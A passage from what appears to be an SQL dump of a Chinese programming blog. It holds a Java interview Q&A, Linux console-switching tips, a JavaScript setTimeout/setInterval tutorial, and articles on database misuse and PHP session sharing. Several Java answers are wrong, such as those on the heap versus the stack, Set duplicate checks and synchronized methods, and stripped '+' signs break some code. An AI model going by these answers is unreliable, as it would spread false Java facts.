许程序员扩展这种语义检查，程序员可以创建自己的异常，并自由选择在何时用throw关键字引发异常。所有的异常都是 java.lang.Thowable的子类。</p>\r\n\r\n<p>2.Java的接口和C&nbsp; 的虚类的相同和不同处。</p>\r\n\r\n<p>由 于Java不支持多继承，而有可能某个类或对象要使用分别在几个类或对象里面的方法或属性，现有的单继承机制就不能满足要求。与继承相比，接口有更高的灵 活性，因为接口中没有任何实现代码。当一个类实现了接口以后，该类要实现接口里面所有的方法和属性，并且接口里面的属性在默认状态下面都是 publicstatic,所有方法默认情况下是public.一个类可以实现多个接口。</p>\r\n\r\n<p>3.垃圾回收的优点和原理。并考虑2种回收机制。</p>\r\n\r\n<p>Java 语言中一个显著的特点就是引入了垃圾回收机制，使c&nbsp;&nbsp; 程序员最头疼的内存管理的问题迎刃而解，它使得Java程序员在编写程序的时候不再需要考虑内存管理。由于有个垃圾回收机制，Java中的对象不再有&ldquo;作 用域&rdquo;的概念，只有对象的引用才有&ldquo;作用域&rdquo;。垃圾回收可以有效的防止内存泄露，有效的使用可以使用的内存。垃圾回收器通常是作为一个单独的低级别的线程 运行，不可预知的情况下对内存堆中已经死亡的或者长时间没有使用的对象进行清除和回收，程序员不能实时的调用垃圾回收器对某个对象或所有对象进行垃圾回 收。回收机制有分代复制垃圾回收和标记垃圾回收，增量垃圾回收。</p>\r\n\r\n<p>4.线程同步的方法。</p>\r\n\r\n<p>wait():使一个线程处于等待状态，并且释放所持有的对象的lock。</p>\r\n\r\n<p>sleep():使一个正在运行的线程处于睡眠状态，是一个静态方法，调用此方法要捕捉InterruptedException异常。</p>\r\n\r\n<p>notify():唤醒一个处于等待状态的线程，注意的是在调用此方法的时候，并不能确切地唤醒某一个等待状态的线程，而是由JVM确定唤醒哪个线程，而且不是按优先级。</p>\r\n\r\n<p>Allnotity():唤醒所有处入等待状态的线程，注意并不是给所有唤醒线程一个对象的锁，而是让它们竞争。</p>\r\n\r\n<p>5.Error与Exception有什么区别？</p>\r\n\r\n<p>Error表示系统级的错误和程序不必处理的异常，</p>\r\n\r\n<p>Exception表示需要捕捉或者需要程序进行处理的异常。</p>\r\n\r\n<p>6.在java中一个类被声明为final类型，表示了什么意思？</p>\r\n\r\n<p>表示该类不能被继承，是顶级类。</p>\r\n\r\n<p>7heap和stack有什么区别。</p>\r\n\r\n<p>栈是一种线形集合，其添加和删除元素的操作应在同一段完成。栈按照后进先出的方式进行处理。堆是栈的一个组成元素。</p>\r\n\r\n<p>8谈谈final,finally,finalize的区别。</p>\r\n\r\n<p>final&mdash;修饰符（关键字）如果一个类被声明为final，意味着它不能再派生出新的子类，不能作为父类被继承。因此一个类不能既被声明为 abstract的，又被声明为final的。将变量或方法声明为final，可以保证它们在使用中不被改变。被声明为final的变量必须在声明时给定 初值，而在以后的引用中只能读取，不可修改。被声明为final的方法也同样只能使用，不能重载。<br />\r\nfinally&mdash;异常处理时提供finally块来执行任何清除操作。如果抛出一个异常，那么相匹配的catch子句就会执行，然后控制就会进入finally块（如果有的话）。<br />\r\nfinalize &mdash;方法名。Java技术允许使用finalize()方法在垃圾收集器将对象从内存中清除出去之前做必要的清理工作。这个方法是由垃圾收集器在确定这个对 象没有被引用时对这个对象调用的。它是在Object类中定义的，因此所有的类都继承了它。子类覆盖finalize()方法以整理系统资源或者执行其他 清理工作。finalize()方法是在垃圾收集器删除对象之前对这个对象调用的。</p>\r\n\r\n<p>9AnonymousInnerClass(匿名内部类)是否可以extends(继承)其它类，是否可以implements(实现)interface(接口)?</p>\r\n\r\n<p>匿名的内部类是没有名字的内部类。不能extends(继承)其它类，但一个内部类可以作为一个接口，由另一个内部类实现。</p>\r\n\r\n<p>10StaticNestedClass和InnerClass的不同<br />\r\nNestedClass（一般是C&nbsp; 的说法），InnerClass(一般是JAVA的说法)。Java内部类与C&nbsp; 嵌套类最大的不同就在于是否有指向外部的引用上。<br />\r\n注：静态内部类（InnerClass）意味着1创建一个static内部类的对象，不需要一个外部类对象，2不能从一个static内部类的一个对象访问一个外部类对象</p>\r\n\r\n<p>11&amp;和&amp;&amp;的区别。<br />\r\n&amp;是位运算符。&amp;&amp;是布尔逻辑运算符。</p>\r\n\r\n<p>12HashMap和Hashtable的区别。</p>\r\n\r\n<p>都属于Map接口的类，实现了将惟一键映射到特定的值上。<br />\r\nHashMap类没有分类或者排序。它允许一个null键和多个null值。</p>\r\n\r\n<p><br />\r\nHashtable类似于HashMap，但是不允许null键和null值。它也比HashMap慢，因为它是同步的。</p>\r\n\r\n<p>13Collection和Collections的区别。</p>\r\n\r\n<p>Collection是个java.util下的接口，它是各种集合结构的父接口。<br />\r\nCollections是个java.util下的类，它包含有各种有关集合操作的静态方法。</p>\r\n\r\n<p>14什么时候用assert。</p>\r\n\r\n<p>断言是一个包含布尔表达式的语句，在执行这个语句时假定该表达式为true。<br />\r\n如果表达式计算为false，那么系统会报告一个Assertionerror。它用于调试目的：<br />\r\nassert(a&gt;0);//throwsanAssertionerrorifa&lt;=0<br />\r\n断言可以有两种形式：<br />\r\nassertExpression1;<br />\r\nassertExpression1:Expression2;<br />\r\nExpression1应该总是产生一个布尔值。<br />\r\nExpression2可以是得出一个值的任意表达式。这个值用于生成显示更多调试<br />\r\n信息的String消息。<br />\r\n断言在默认情况下是禁用的。要在编译时启用断言，需要使用source1.4标记：<br />\r\njavac-source1.4Test.java<br />\r\n要在运行时启用断言，可使用-enableassertions或者-ea标记。<br />\r\n要在运行时选择禁用断言，可使用-da或者-disableassertions标记。<br />\r\n要系统类中启用断言，可使用-esa或者-dsa标记。还可以在包的基础上启用或者禁用断言。<br />\r\n可 以在预计正常情况下不会到达的任何位置上放置断言。断言可以用于验证传递给私有方法的参数。不过，断言不应该用于验证传递给公有方法的参数，因为不管是否 启用了断言，公有方法都必须检查其参数。不过，既可以在公有方法中，也可以在非公有方法中利用断言测试后置条件。另外，断言不应该以任何方式改变程序的状 态。</p>\r\n\r\n<p>15GC是什么?为什么要有GC?(基础)。</p>\r\n\r\n<p>GC是垃圾收集器。Java程序员不用担心内存管理，因为垃圾收集器会自动进行管理。要请求垃圾收集，可以调用下面的方法之一：<br />\r\nSystem.gc()<br />\r\nRuntime.getRuntime().gc()</p>\r\n\r\n<p>16Strings=newString(&quot;xyz&quot;);创建了几个StringObject?</p>\r\n\r\n<p>两个对象，一个是&ldquo;xyz&rdquo;,一个是指向&ldquo;xyz&rdquo;的引用对象s。</p>\r\n\r\n<p>17Math.round(11.5)等於多少?Math.round(-11.5)等於多少?</p>\r\n\r\n<p>Math.round(11.5)返回（long）12，Math.round(-11.5)返回（long）-11;</p>\r\n\r\n<p>18shorts1=1;s1=s1 1;有什么错?shorts1=1;s1 =1;有什么错?</p>\r\n\r\n<p>shorts1=1;s1=s1 1;有错，s1是short型，s1 1是int型,不能显式转化为short型。可修改为s1=(short)(s1 1)。shorts1=1;s1 =1正确。</p>\r\n\r\n<p>19sleep()和wait()有什么区别?搞线程的最爱</p>\r\n\r\n<p>sleep()方法是使线程停止一段时间的方法。在sleep时间间隔期满后，线程不一定立即恢复执行。这是因为在那个时刻，其它线程可能正在运行而且没有被调度为放弃执行，除非(a)&ldquo;醒来&rdquo;的线程具有更高的优先级(b)正在运行的线程因为其它原因而阻塞。<br />\r\nwait()是线程交互时，如果线程对一个同步对象x发出一个wait()调用，该线程会暂停执行，被调对象进入等待状态，直到被唤醒或等待时间到。</p>\r\n\r\n<p>20Java有没有goto?<br />\r\nGoto&mdash;java中的保留字，现在没有在java中使用。</p>\r\n\r\n<p>21数组有没有length()这个方法?String有没有length()这个方法？</p>\r\n\r\n<p>数组没有length()这个方法，有length的属性。<br />\r\nString有有length()这个方法。</p>\r\n\r\n<p>22Overload和Override的区别。Overloaded的方法是否可以改变返回值的类型?</p>\r\n\r\n<p>方法的重写Overriding和重载Overloading是Java多态性的不同表现。重写Overriding是父类与子类之间多态性的一种表 现，重载Overloading是一个类中多态性的一种表现。如果在子类中定义某方法与其父类有相同的名称和参数，我们说该方法被重写 (Overriding)。子类的对象使用这个方法时，将调用子类中的定义，对它而言，父类中的定义如同被&ldquo;屏蔽&rdquo;了。如果在一个类中定义了多个同名的方 法，它们或有不同的参数个数或有不同的参数类型，则称为方法的重载(Overloading)。<br />\r\nOverloaded的方法是可以改变返回值的类型。</p>\r\n\r\n<p>23Set里的元素是不能重复的，那么用什么方法来区分重复与否呢?是用==还是equals()?它们有何区别?</p>\r\n\r\n<p>Set里的元素是不能重复的，那么用iterator()方法来区分重复与否。equals()是判读两个Set是否相等。equals()和==方法决定引用值是否指向同一对象equals()在类中被覆盖，为的是当两个分离的对象的内容和类型相配的话，返回真值。</p>\r\n\r\n<p>24最常见到的runtimeexception。</p>\r\n\r\n<p>ArithmeticException,ArrayStoreException,BufferOverflowException,BufferUnderflowException,CannotRedoException,CannotUndoException,ClassCastException,CMMException,ConcurrentModificationException,DOMException,EmptyStackException,IllegalArgumentException,IllegalMonitorStateException,IllegalPathStateException,IllegalStateException,ImagingOpException,IndexOutOfBoundsException,MissingResourceException,NegativeArraySizeException,NoSuchElementException,NullPointerException,ProfileDataException,ProviderException,RasterFORMatException,Secur<br />\r\nityException,SystemException,UndeclaredThrowableException,UnmodifiableSetException,UnsupportedOperationException</p>\r\n\r\n<p>25error和exception有什么区别?</p>\r\n\r\n<p>error表示恢复不是不可能但很困难的情况下的一种严重问题。比如说内存溢出。不可能指望程序能处理这样的情况。<br />\r\nexception表示一种设计或实现问题。也就是说，它表示如果程序运行正常，从不会发生的情况。</p>\r\n\r\n<p>26List,Set,Map是否继承自Collection接口?</p>\r\n\r\n<p>List，Set是<br />\r\nMap不是</p>\r\n\r\n<p>27abstractclass和interface有什么区别?</p>\r\n\r\n<p>声明方法的存在而不去实现它的类被叫做抽象类（abstractclass），它用于要创建一个体现某些基本行为的类，并为该类声明方法，但不能在该类 中实现该类的情况。不能创建abstract类的实例。然而可以创建一个变量，其类型是一个抽象类，并让它指向具体子类的一个实例。不能有抽象构造函数或 抽象静态方法。Abstract类的子类为它们父类中的所有抽象方法提供实现，否则它们也是抽象类为。取而代之，在子类中实现该方法。知道其行为的其它类 可以在类中实现这些方法。<br />\r\n接口（interface）是抽象类的变体。在接口中，所有方法都是抽象的。多继承性可通过实现这样的接口而获得。接口 中的所有方法都是抽象的，没有一个有程序体。接口只可以定义staticfinal成员变量。接口的实现与子类相似，除了该实现类不能从接口定义中继承行 为。当类实现特殊接口时，它定义（即将程序体给予）所有这种接口的方法。然后，它可以在实现了该接口的类的任何对象上调用接口的方法。由于有抽象类，它允 许使用接口名作为引用变量的类型。通常的动态联编将生效。引用可以转换到接口类型或从接口类型转换，instanceof运算符可以用来决定某对象的类是 否实现了接口。</p>\r\n\r\n<p>28abstract的method是否可同时是static,是否可同时是native，是否可同时是synchronized?</p>\r\n\r\n<p>都不能</p>\r\n\r\n<p>29接口是否可继承接口?抽象类是否可实现(implements)接口?抽象类是否可继承实体类(concreteclass)?</p>\r\n\r\n<p>接口可以继承接口。抽象类可以实现(implements)接口，抽象类可继承实体类，但前提是实体类必须有明确的构造函数。</p>\r\n\r\n<p>30启动一个线程是用run()还是start()?</p>\r\n\r\n<p>启动一个线程是调用start()方法，使线程所代表的虚拟处理机处于可运行状态，这意味着它可以由JVM调度并执行。这并不意味着线程就会立即运行。run()方法可以产生必须退出的标志来停止一个线程。</p>\r\n\r\n<p>31构造器Constructor是否可被override?</p>\r\n\r\n<p>构造器Constructor不能被继承，因此不能重写Overriding，但可以被重载Overloading。</p>\r\n\r\n<p>32是否可以继承String类?</p>\r\n\r\n<p>String类是final类故不可以继承。</p>\r\n\r\n<p>33当一个线程进入一个对象的一个synchronized方法后，其它线程是否可进入此对象的其它方法?</p>\r\n\r\n<p>不能，一个对象的一个synchronized方法只能由一个线程访问。</p>\r\n\r\n<p>33try{}里有一个return语句，那么紧跟在这个try后的finally{}里的code会不会被执行，什么时候被执行，在return前还是后?<br />\r\n会执行，在return前执行。</p>\r\n\r\n<p>34编程题:用最有效率的方法算出2乘以8等於几?</p>\r\n\r\n<p>2&lt;&lt;3</p>\r\n\r\n<p>35两个对象值相同(x.equals(y)==true)，但却可有不同的hashcode，这句话对不对?</p>\r\n\r\n<p>不对，有相同的hashcode。</p>\r\n\r\n<p>36当一个对象被当作参数传递到一个方法后，此方法可改变这个对象的属性，并可返回变化后的结果，那么这里到底是值传递还是引用传递?</p>\r\n\r\n<p>是值传递。Java编程语言只由值传递参数。当一个对象实例作为一个参数被传递到方法中时，参数的值就是对该对象的引用。对象的内容可以在被调用的方法中改变，但对象的引用是永远不会改变的。</p>\r\n\r\n<p>37swtich是否能作用在byte上，是否能作用在long上，是否能作用在String上?</p>\r\n\r\n<p>switch（expr1）中，expr1是一个整数表达式。因此传递给switch和case语句的参数应该是int、short、char或者byte。long,string都不能作用于swtich。</p>\r\n\r\n<p>38 Hashtable和HashMap</p>\r\n\r\n<p>Hashtable继承自Dictionary类，而HashMap是Java1.2引进的Mapinterface的一个实现<br />\r\nHashMap允许将null作为一个entry的key或者value，而Hashtable不允许<br />\r\n还有就是，HashMap把Hashtable的contains方法去掉了，改成containsvalue和containsKey。因为contains方法容易让人引起误解。<br />\r\n最大的不同是，Hashtable的方法是Synchronize的，而HashMap不是，在<br />\r\n多个线程访问Hashtable时，不需要自己为它的方法实现同步，而HashMap就必须为之提供外同步。<br />\r\nHashtable和HashMap采用的hash/rehash算法都大概一样，所以性能不会有很大的差异。</p>\r\n',0,1437040982,0,0),(20,18,'linux(redhat,ubuntu,centos等) 图形界面和文本界面(字符界面)的切换','<p>linux(redhat,ubuntu,centos等)图形界面和文本界面(字符界面)的切换</p>\r\n\r\n<p>各种环境略有差异，我虚拟机里安装的是ylmf os算是Ubuntu，</p>\r\n\r\n<p>切换方法是：ctrl+alt+shift+F1切换到字符界面，alt+F7切换到图形界面。</p>\r\n\r\n<p>由字符界面切换到图形界面可用两种简单方法实现：<br />\r\n1、在字符界面输入startx或init 5 。<br />\r\n2、通过编辑/etc/inittab文件实现默认进入图形界面。<br />\r\n把其中的id:3:initdefault中的3改为5，这样以后系统启动后将直接进入图形界面模式。</p>\r\n\r\n<p>真机环境中，在图形界面和文本界面间切换：<br />\r\nCtrl+Alt+F(n),其中F(n)为F1-F6 ，为6个控制台；<br />\r\nCtrl+ALT+F7;</p>\r\n\r\n<p>虚拟机环境，在图形界面和文本界面间切换：<br />\r\nVMWare虚拟机下，由图形界面切换到文本界面，和虚拟机设置有关，默认VM占用Ctrl+Alt为热键，所以由图形界面切换到文本界面的组合键为：<br />\r\nCtrl+Alt+Shift+F(n),其中F(n)为F1-F6;<br />\r\n由文本界面切换回图形界面的组合键为:<br />\r\nAlt+F7;</p>\r\n',0,1437042280,0,0),(21,1,'JS定时器','<p>定时器可以说是js前端最常用的工具，几乎所有的逐渐变化的动态效果都会使用到定时器，比如说图片滚动（位置渐变）。渐隐渐现。拖拽（不使用计时器会多消耗大量资源）等等。我准备近几天写3篇文章，第一篇是计时器，第二篇说下scrollLeft（right...）的用法，第三篇顺理成章的介绍无间断滚动的实现方法。</p>\r\n\r\n<p>这篇文章主要针对js入门新手，或者基础不扎实的半路出家js程序员。</p>\r\n\r\n<p>定时器分两种分别是setTimeout和setInterval。</p>\r\n\r\n<p>两者的用法分别是setTimeout(funhander,time);setInterval(fnhander,time);设置的相应计时器需要用clearTimeout(对象)和clearInterval（对象）清掉。有以下几点需要注意：</p>\r\n\r\n<p>第一：setTimeout(funhander,time)的作用是在过time毫秒后，执行一次句柄funhander指向的方法。而setInterval（funhander,time）的作用是，每隔time毫秒后，就执行一次句柄funhander指向的方法。一直到我清掉计时器停止。</p>\r\n\r\n<p>第二：巨大多数的计时器使用都是为了执行渐变、渐隐渐现、位置渐变等效果，所以funhander指向的方法会被多次执行。因此如果我们使用setTimeout做定时器，一般要把计时器的设置写在funhander指向的方法里，这样就可以循环调用，多次执行funhander，一直到我清掉这个定时器。而在使用setInterval设置定时器的时候，一般要放在funhander指向行数的外面。</p>\r\n\r\n<p>第三：funhander指向的方法里处理了渐变中的一步，又会被重复执行，所以在此方法中大多包含有判断语句IF。用来控制渐变到一定程度的时候进行相应处理。比如清掉定时器或者进行循环操作。</p>\r\n\r\n<p>第四：funhander为句柄，此处还可以为代码段，假设重复调用的函数为function test() {alert(&quot;1&quot;);}则，我们可以写为 var timer = setTimeout(test,1000)或者 var timer = setTimeout(&quot;test()&quot;,1000)或者 var timer = setTimeout(&quot;alert(&quot;1&quot;)&quot;,1000)。但是下面的写法是错误的。var timer = setTimeout(test(),1000)。</p>\r\n\r\n<p>第五：因为funhander部分是句柄，所以不能传递参数，但是有些函数是必须要传递参数的，这时候我们一般用代码段。如果碰到又需要用句柄，又不能用代码段的特殊情况，我们一般用比较特殊的方法处理。如 var timer =setTimeout(test(name),1000)。这时候这个test（name）看起来是不对的，实际上如果他的返回值是一个没有传参的方法，利用子函数可以调用父函数变量的特点，把参数传递到返回函数（子函数）内部。那上面的写法一样是可以的。</p>\r\n\r\n<p>第六：在设定时器的时候一定要有返回值timer（当然你可以起自己想要的名字）。清掉定时器的时候需要使用，也是一个好的习惯。</p>\r\n\r\n<p>下面是网上常见的一个例子，我稍微改动了下。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150716185321702105.jpg\" style=\"height:65px; width:310px\" /></p>\r\n\r\n<p>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;<br />\r\n&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;<br />\r\n&lt;head&gt;<br />\r\n&lt;title&gt; New Document &lt;/title&gt;<br />\r\n&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;<br />\r\n&lt;/head&gt;<br />\r\n&lt;body&gt;<br />\r\n&lt;form action=&quot;&quot;&gt;<br />\r\n&lt;input type=&quot;text&quot; value=&quot;0&quot; name=&quot;txt1&quot;/&gt;<br />\r\n&lt;input type=&quot;button&quot; value=&quot;开始&quot; name=&quot;btnStart&quot;/&gt;<br />\r\n&lt;input type=&quot;button&quot; value=&quot;重置&quot; name=&quot;btnReset&quot;/&gt;<br />\r\n&lt;/form&gt;<br />\r\n&lt;/body&gt;<br />\r\n&lt;/html&gt;<br />\r\n&lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt;<br />\r\n&lt;!--<br />\r\n//获取表单中的表单域<br />\r\nvar txt=document.forms[0].elements[&quot;txt1&quot;];<br />\r\nvar btnStart=document.forms[0].elements[&quot;btnStart&quot;];<br />\r\nvar btnReset=document.forms[0].elements[&quot;btnReset&quot;]<br />\r\n//定义定时器的id<br />\r\nvar id;<br />\r\n//每10毫秒该值增加1<br />\r\nvar seed=0;</p>\r\n\r\n<p>btnStart.onclick=function(){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //根据按钮文本来判断当前操作<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(this.value==&quot;开始&quot;){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //使按钮文本变为停止<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.value=&quot;停止&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //使重置按钮不可用<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; btnReset.disabled=true;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //设置定时器，每0.01s跳一次<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; id=window.setInterval(tip,10);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }else{<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //使按钮文本变为开始<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.value=&quot;开始&quot;;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //使重置按钮可用<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; btnReset.disabled=false;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; //取消定时<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; window.clearInterval(id);<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br />\r\n}</p>\r\n\r\n<p>//重置按钮<br />\r\nbtnReset.onclick=function(){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp; seed=0;<br />\r\ntxt.value=seed/100;<br />\r\n}<br />\r\n//让秒表跳一格<br />\r\nfunction tip(){<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; seed++;<br />\r\n&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; txt.value=seed/100;<br />\r\n}<br />\r\n//--&gt;<br />\r\n&lt;/script&gt;</p>\r\n',0,1437044034,0,0),(22,21,'三种东西永远不要放到数据库里','<p>我已经在很多演讲里说过，改进你的系统的最好的方法是先避免做&ldquo;蠢事&rdquo;。我并不是说你或你开发的东西&ldquo;蠢&rdquo;，只是有些决定很容易被人们忽略掉其暗含的牵连，认识不到这样做对系统维护尤其是系统升级带来多大的麻烦。作为一个顾问，像这样的事情我到处都能见到，我还从来没有见过做出这样的决定的人有过好的结果的。</p>\r\n\r\n<p>图片，文件，二进制数据<br />\r\n既然数据库支持BLOB类型的数据，把文件塞进BLOB字段里一定没有错了！？错，不是这样的！别的先不提，在很多数据库语言里，处理大字段都不是很容易。</p>\r\n\r\n<p>把文件存放在数据库里有很多问题：</p>\r\n\r\n<p>对数据库的读/写的速度永远都赶不上文件系统处理的速度<br />\r\n数据库备份变的巨大，越来越耗时间<br />\r\n对文件的访问需要穿越你的应用层和数据库层<br />\r\n这后两个是真正的杀手。把图片缩略图存到数据库里？很好，那你就不能使用nginx或其它类型的轻量级服务器来处理它们了。</p>\r\n\r\n<p>给自己行个方便吧，在数据库里只简单的存放一个磁盘上你的文件的相对路径，或者使用S3或CDN之类的服务。</p>\r\n\r\n<p>短生命期数据<br />\r\n使用情况统计数据，测量数据，GPS定位数据，session数据，任何只是短时间内对你有用，或经常变化的数据。如果你发现自己正在使用定时任务从某个表里删除有效期只有一小时，一天或数周的数据，那说明你没有找对正确的做事情的方法。使用redis，statsd/graphite， Riak，它们都是干这种事情更合适的工具。这建议也适用于对于收集那些短生命期的数据。</p>\r\n\r\n<p>当然，用挖土机在后花园里种土豆也是可行的，但相比起从储物间里拿出一把铲子，你预约一台挖土机、等它赶到你的园子里挖坑，这显然更慢。你要选择合适的工具来处理手头上的事。</p>\r\n\r\n<p>日志文件<br />\r\n把日志数据存放到数据库里，表面上看起来似乎不错，而且&ldquo;将来也许我需要对这些数据进行复杂的查询&rdquo;，这样的话很得人心。这样做并不是一个特别差的做法，但如果你把日志数据和你的产品数据存放到一个数据库里就非常不好了。</p>\r\n\r\n<p>也许你的日志记录做的很保守，每次web请求只产生一条日志。对于整个网站的每个事件来说，这仍然会产生大量的数据库插入操作，争夺你用户需要的数据库资源。如果你的日志级别设置为verbose或debug，那等着看你的数据库着火吧。</p>\r\n\r\n<p>你应该使用一些比如Splunk Loggly或纯文本文件来存放你的日志数据。这样去查看它们也许会不方便，但这样的时候不多，甚至有时候你需要写出一些代码来分析出你想要的答案，但总的来说是值得的。</p>\r\n\r\n<p>可是稍等一下，你是那片不一样的雪花，你遇到的问题会如此的不同，所以，如果你把上面提到的三种东西中的某一种放到了数据库里也不会有问题。不，你错了，不，你不特殊。相信我。</p>\r\n',0,1437044447,0,0),(23,22,'session多服务器共享的方案梳理','<p>session的存储了解以前是怎么做的，搞清楚了来龙去脉，才会明白进行共享背后的思想和出发点。我喜欢按照这样的方式来问(或者去搞清楚)：为什么要session要进行共享，不共享会什么问题呢？</p>\r\n\r\n<p>php中session的原理，以前做了一下总结，可以参考：http://www.cnblogs.com/wangtao_20/archive/2011/02/16/1955659.html</p>\r\n\r\n<p>以前业界使用session的做法：<br />\r\n默认情况下，php的session文件是保存在磁盘文件中。在php.ini配置文件中的配置项如下：<br />\r\nsession.save_handler = files<br />\r\nsession.save_path = &quot;N;/path&quot;<br />\r\n第一个配置项是指定使用files(文件形式)存储session数据。<br />\r\n第二个参数指定保存的路径。N表示生成多少级目录(不放到一个目录下，分散到多个磁盘目录中去)</p>\r\n\r\n<p>我的配置项是：session.save_path = &quot;F:/wamp/tmp&quot;。那么就会去这个目录下面看到很多session数据的文件。<br />\r\n当我们使用php的内置函数session_start()的时候，就是去上面指定的磁盘目录把session数据载入，实际上就是拿类似<br />\r\nsess_74dd7807n2mfml49a1i12hkc45的文件。<br />\r\n74dd7807n2mfml49a1i12hkc45就是大家经常说的什么session的id号。</p>\r\n\r\n<p>php.ini中还有一个关键配置项，如下：<br />\r\nsession.name = PHPSESSID<br />\r\nPHPSESSID就是cookie的名称，其实上面一串&quot;74dd7807n2mfml49a1i12hkc45&quot;会保存在一个名为PHPSESSID的cookie中。</p>\r\n\r\n<p>根据http的请求机制，当浏览器请求的时候，头部信息会把浏览器中的cookie一起发给服务器。PHPSESSID这个cookie也<br />\r\n是在其中发给了服务器，php引擎通过读取PHPSESSID的值来确定要载入哪个session文件。<br />\r\n比如值为74dd7807n2mfml49a1i12hkc45，载入的就是&quot;sess_74dd7807n2mfml49a1i12hkc45&quot;。</p>\r\n\r\n<p>注：当你调用php的函数session_start(),才表明你需要使用session文件了。不然平白无故就去载入文件，浪费性能。</p>\r\n\r\n<p>===========================================</p>\r\n\r\n<p>根据如上原理。session的数据默认是保存在磁盘文件中。假设这种情况：多台php服务器进行负载均衡的时候，比如有三台php服务器，为了实现负载均衡，那么三台服务器上面的php代码都是一样(拷贝一份)。</p>\r\n\r\n<p><img alt=\"\" src=\"/data/pic/20150719134802595538.jpg\" style=\"height:302px; width:558px\" /></p>\r\n\r\n<p>上面的图是nginx+fpm部署图。可以看到多台php服务器进行负载均衡。</p>\r\n\r\n<p>生成session数据文件都是在本地了(a,b,c各自的服务器磁盘上)。负载均衡的目的本来就是要为了平均分配请求，所以没有固定第一次访问和第二次访问是同一台服务器，实际上无法确定的。第一秒访问可能是a服务器，第二秒访问的可能是c服务器。<br />\r\n所以同一个登录会员，实际上就会出现：第一秒访问第一台php服务器，第二秒访问的是第二台服务器。登录的信息一般是保存在session中的。这样子登录保存的session数据就需要进行共享了。不然的话会出现，访问第一台服务器生成了一个session数据。第二秒负载请求到第三台服务器，结果获取不到刚才生成的session数据。</p>\r\n\r\n<p>我的理解是：只有涉及到多台后端服务器(php,java等处理服务器)的时候，才涉及到session读取不到的问题。</p>\r\n\r\n<p>在php环境中，只有多台php服务器(php服务器而非web服务器,session文件是php引擎生成的)的情况下，才会涉及到session共享的问题。单台php服务器，存储都在一台主机上。不涉及到共享问题。因为session直接存储在这台服务器磁盘上是能够被本机读取到的。<br />\r\n如果是：一台php服务器，多台mysql服务器。这种也是负载均衡，这种负载均衡不涉及到共享问题。因为怎么session数据怎么操作都是保存在一台服务器上。</p>\r\n\r\n<p>===============================================================================================================================================</p>\r\n\r\n<p>ps：实际上，session在php,.net,java等只要是后端语言都会用到。session的存储机制，各种语言都大体差不多。我觉得这跟cookie在各个语言中都会用到差不多。.net，java我没去了解过。但是存储原理是差不多的。区别就是，php，java，.net调用的函数，读和取session数据的方式不同。默认都是存储在本地文件中的(不然怎么会涉及到session共享问题呢，存储在数据库本身就可以实现共享的)。<br />\r\n所以，无论是.net还是java都会涉及到session数据共享的问题。</p>\r\n\r\n<p>其实我的理解是，session的原理都是一样的。讨论session共享方案设计，是可以抛开具体的语言去讨论session共享方案设计。</p>\r\n\r\n<p>目前业界解决session共享的几种思路，我总结如下：<br />\r\n第一种办法：把原来存储在服务器磁盘上的session数据存储到客户端的cookie中去。<br />\r\n这样子，就不需要涉及到数据共享了。a客户端请求的时候，原来生成在服务器的数据生成到浏览器的cookie中，根据cookie中的数据识别用户。php由原来的&rdquo;从本地(也就是服务器)磁盘上读取session数据&rdquo;转变为&rdquo;浏览器的cookie中读取数据&rdquo;。<br />\r\n这样子，在多台php服务器负载均衡的情况下，即便第一秒请求是a服务器，第二秒请求是b服务器，都不需要管哪台服务器了。反正都是读取客户端上的cookie数据。<br />\r\n一般是把session数据按照自己定义的加密规则，加密后后存在cookie中。</p>\r\n\r\n<p>数据保存在cookie中这种做法有好处，也有坏处。<br 